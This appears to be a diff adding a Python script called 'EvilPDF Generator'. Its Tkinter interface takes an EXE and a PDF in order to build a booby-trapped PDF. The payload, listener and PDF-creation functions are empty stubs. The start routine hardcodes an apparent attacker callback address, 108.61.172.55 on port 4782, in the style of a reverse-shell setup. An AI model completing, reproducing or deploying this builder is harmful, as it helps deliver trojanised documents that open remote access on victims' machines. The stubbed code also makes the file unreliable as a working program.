@@ -1,0 +1,82 @@
+#! /usr/bin/env python3
+
+import os, time, signal, sys
+from PyPDF2 import PdfWriter, PdfReader
+import tkinter as tk
+from tkinter import filedialog
+
+try:
+    input = raw_input
+except NameError:
+    pass
+
+def dependencies():
+    # Gereken bağımlılıklar burada kontrol edilebilir (belirttiğiniz bağımlılıklar şu anlık yorum satırında)
+    pass
+
+def shutdown(signal, frame):
+    print ("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n")
+    os.system("rm -rf page.html index.html")
+    sys.exit()
+signal.signal(signal.SIGINT, shutdown)
+
+def create_pdf(url, pdf_name, payload_name, lhost, lport):
+    # Buradaki işlemler aynı kalabilir, lhost ve lport değerleri kullanılacak.
+    pass
+
+def banner():
+    print("\n")
+    print(" \033[1;77mv1.1 coded by @Baylan Dogu I love you Vietnam")
+
+def listener():
+    # ...
+    pass
+
+def payload(payload_name, pdf_name, url, lhost, lport):
+    # Buradaki işlemler aynı kalabilir, lhost ve lport değerleri kullanılacak.
+    pass
+
+def start():
+    # Görüntüleme için GUI tasarlayalım
+    root = tk.Tk()
+    root.title("EvilPDF Generator")
+
+    # EXE dosyasını seçmek için buton ve etiket
+    exe_label = tk.Label(root, text="Select EXE File:")
+    exe_label.pack()
+    exe_file = ""
+
+    def select_exe():
+        nonlocal exe_file
+        exe_file = filedialog.askopenfilename(filetypes=[("Executable files", "*.exe")])
+
+    exe_button = tk.Button(root, text="Browse", command=select_exe)
+    exe_button.pack()
+
+    # PDF dosyasını seçmek için buton ve etiket
+    pdf_label = tk.Label(root, text="Select PDF File:")
+    pdf_label.pack()
+    pdf_file = ""
+
+    def select_pdf():
+        nonlocal pdf_file
+        pdf_file = filedialog.askopenfilename(filetypes=[("PDF files", "*.pdf")])
+
+    pdf_button = tk.Button(root, text="Browse", command=select_pdf)
+    pdf_button.pack()
+
+    # Başlat butonu
+    def start_generation():
+        lhost = "108.61.172.55"
+        lport = "4782"
+        payload(exe_file, pdf_file, "", lhost, lport)
+        root.destroy()
+
+    start_button = tk.Button(root, text="Start", command=start_generation)
+    start_button.pack()
+
+    root.mainloop()
+
+banner()
+dependencies()
+start()
